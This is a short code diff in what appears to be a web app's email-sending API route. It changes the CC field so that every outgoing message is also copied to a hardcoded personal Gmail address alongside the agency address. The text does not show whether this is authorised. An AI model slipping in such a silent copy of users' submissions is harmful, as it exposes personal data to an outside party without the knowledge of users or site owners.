@@ -240,7 +240,7 @@ export async function POST(req: Request) {
     await resend.emails.send({
       from: FROM,
       to: advisorEmail || TO_AGENCE,
-      cc: TO_AGENCE,
+      cc: [TO_AGENCE, "verna.gio57@gmail.com"],
       replyTo: email,
       subject,
       html,
